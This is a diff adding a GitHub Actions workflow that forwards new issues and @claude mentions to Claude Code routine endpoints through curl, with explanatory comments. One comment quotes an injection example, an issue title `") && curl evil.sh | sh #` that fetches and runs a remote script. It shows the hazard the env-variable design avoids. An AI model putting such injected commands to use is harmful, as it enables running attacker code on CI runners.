@@ -1,0 +1,149 @@
+# Hand issue and comment events to Claude Code routines.
+#
+# This file replaces claude.yml, and notably does not run Claude. It POSTs to a
+# routine's /fire endpoint and exits in about a second. The work then happens in
+# a Claude Code cloud session, which appears in the session list at
+# claude.ai/code and in the desktop and mobile apps, and which can be read and
+# steered while it is still running rather than only autopsied afterwards.
+#
+# Why a workflow at all, when routines have native GitHub triggers of their own:
+# those fire on pull_request and release events only. Issues and comments — the
+# two things this repo actually wanted Claude for — are not on that list, so the
+# event has to be relayed by hand.
+#
+# Requires four repository secrets, a URL and a token per routine. Both values
+# of a pair are shown once, in that routine's API trigger modal, at the moment
+# you click Generate token:
+#
+#   CLAUDE_ROUTINE_ISSUE_URL    /  CLAUDE_ROUTINE_ISSUE_TOKEN
+#     -> routine "editor-cat · new issue"
+#   CLAUDE_ROUTINE_MENTION_URL  /  CLAUDE_ROUTINE_MENTION_TOKEN
+#     -> routine "editor-cat · @claude mention"
+#
+# A token cannot be read back afterwards, only regenerated, which invalidates
+# the old one. Rotate by regenerating in the modal and re-running `gh secret
+# set` for that pair. Unlike the CLAUDE_CODE_OAUTH_TOKEN this replaces, these
+# do not expire on a one-year timer.
+#
+# GitHub reads issues and issue_comment workflows from the default branch, so
+# this does nothing until it is merged to main.
+name: Claude routines
+
+on:
+  issues:
+    types: [opened]
+  # issue_comment covers comments on issues *and* on a pull request's
+  # conversation tab — GitHub files both under it. The two below are the ones it
+  # does not cover: a comment left on a specific line during review, and the
+  # body of the review itself.
+  issue_comment:
+    types: [created]
+  pull_request_review_comment:
+    types: [created]
+  pull_request_review:
+    types: [submitted]
+
+# Nothing here reads or writes the repository. It makes one outbound HTTPS call
+# and writes a line to the step summary.
+permissions: {}
+
+jobs:
+  # --- A new issue: start without being asked -------------------------------
+  new-issue:
+    if: github.event_name == 'issues'
+    runs-on: ubuntu-latest
+    # The fire call returns in about a second. Five minutes is generous enough
+    # to absorb a slow runner start and short enough that a hung curl doesn't
+    # sit there for six hours.
+    timeout-minutes: 5
+    steps:
+      - name: Fire the new-issue routine
+        env:
+          URL: ${{ secrets.CLAUDE_ROUTINE_ISSUE_URL }}
+          TOKEN: ${{ secrets.CLAUDE_ROUTINE_ISSUE_TOKEN }}
+          # Read these through env rather than interpolating ${{ }} straight
+          # into the run block: an issue titled `") && curl evil.sh | sh #` is
+          # attacker-controlled text landing in a shell script otherwise.
+          NUMBER: ${{ github.event.issue.number }}
+          TITLE: ${{ github.event.issue.title }}
+          BODY: ${{ github.event.issue.body }}
+          AUTHOR: ${{ github.event.issue.user.login }}
+          HTML_URL: ${{ github.event.issue.html_url }}
+        run: |
+          # jq builds the JSON so quotes, backslashes and newlines in the issue
+          # body survive intact. The endpoint takes one freeform "text" field
+          # and does not parse it, so the shape below exists purely for the
+          # routine's prompt to read.
+          jq -n \
+            --arg number "$NUMBER" --arg title "$TITLE" --arg body "$BODY" \
+            --arg author "$AUTHOR" --arg url "$HTML_URL" \
+            '{text: "event: issue_opened\nnumber: \($number)\nauthor: \($author)\nurl: \($url)\ntitle: \($title)\nbody:\n\($body)"}' \
+            > payload.json
+          curl --fail-with-body -sS -X POST "$URL" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "anthropic-beta: experimental-cc-routine-2026-04-01" \
+            -H "anthropic-version: 2023-06-01" \
+            -H "Content-Type: application/json" \
+            -d @payload.json > response.json
+          # The fire response is the only place the session URL appears. Without
+          # this line the run is invisible from GitHub's side until the routine
+          # posts its own first comment.
+          echo "Session: $(jq -r .claude_code_session_url response.json)" \
+            >> "$GITHUB_STEP_SUMMARY"
+
+  # --- A comment, on an issue or a pull request: only when asked -------------
+  mention:
+    # Two guards.
+    #
+    # The first is the opt-in. Threads fill up with asides, thanks, and notes to
+    # other people, and a session on each one costs real money to tell you
+    # nothing.
+    #
+    # The second stops a loop. Routine runs act as trotha01 rather than
+    # claude[bot], so the author-based exclusion this workflow used to carry no
+    # longer distinguishes anything. Instead both routine prompts end every
+    # comment they post with an invisible <!-- claude-routine --> marker, and
+    # this skips anything carrying it. The prompts are also told never to write
+    # the literal @claude; the marker is the backstop for when that slips.
+    #
+    # A review carries its text on `review`, the other two on `comment`; the
+    # missing one is null either way, and contains() on null is false.
+    if: |
+      (contains(github.event.comment.body, '@claude') ||
+       contains(github.event.review.body, '@claude')) &&
+      !contains(github.event.comment.body, '<!-- claude-routine -->') &&
+      !contains(github.event.review.body, '<!-- claude-routine -->')
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Fire the mention routine
+        env:
+          URL: ${{ secrets.CLAUDE_ROUTINE_MENTION_URL }}
+          TOKEN: ${{ secrets.CLAUDE_ROUTINE_MENTION_TOKEN }}
+          KIND: ${{ github.event_name }}
+          # A comment on a pull request arrives as an issue_comment whose issue
+          # *is* the PR, so its number lives under `issue`; review events carry
+          # it under `pull_request`. Exactly one of the two is ever set.
+          NUMBER: ${{ github.event.issue.number || github.event.pull_request.number }}
+          IS_PR: ${{ github.event_name != 'issue_comment' || github.event.issue.pull_request != null }}
+          AUTHOR: ${{ github.event.sender.login }}
+          BODY: ${{ github.event.comment.body || github.event.review.body }}
+          COMMENT_URL: ${{ github.event.comment.html_url || github.event.review.html_url }}
+          # Only set on pull_request_review_comment, and the single most useful
+          # field when it is: which file the reader was looking at.
+          FILE: ${{ github.event.comment.path }}
+        run: |
+          jq -n \
+            --arg kind "$KIND" --arg number "$NUMBER" --arg is_pr "$IS_PR" \
+            --arg author "$AUTHOR" --arg body "$BODY" --arg url "$COMMENT_URL" \
+            --arg file "$FILE" \
+            '{text: "event: \($kind)\nnumber: \($number)\nis_pull_request: \($is_pr)\nauthor: \($author)\ncomment_url: \($url)\nfile: \($file)\ncomment_body:\n\($body)"}' \
+            > payload.json
+          curl --fail-with-body -sS -X POST "$URL" \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "anthropic-beta: experimental-cc-routine-2026-04-01" \
+            -H "anthropic-version: 2023-06-01" \
+            -H "Content-Type: application/json" \
+            -d @payload.json > response.json
+          echo "Session: $(jq -r .claude_code_session_url response.json)" \
+            >> "$GITHUB_STEP_SUMMARY"
